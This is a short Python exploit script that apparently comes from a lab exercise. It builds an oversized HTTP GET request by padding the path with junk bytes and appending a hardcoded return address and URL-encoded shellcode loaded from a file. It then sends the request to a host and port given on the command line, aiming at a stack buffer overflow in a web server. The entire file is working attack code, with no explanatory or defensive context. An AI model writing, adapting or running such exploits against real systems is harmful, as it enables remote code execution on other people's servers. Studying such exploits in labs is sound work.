#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

def build_exploit(shellcode):

    start_data = b"GET /"
    junk_data = b'a'
    end_data =  b" HTTP/1.0\r\n\r\n"

    shellcode = urllib.parse.quote_from_bytes(shellcode).encode('ascii')

    return_address = urllib.parse.quote_from_bytes(b'\xc0\xec\xff\xff\xff\x7f\x00\x00').encode('ascii')
    junk_data_length = 4124 - len(start_data)
    req = start_data + junk_data * junk_data_length + return_address + shellcode + end_data 
    
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
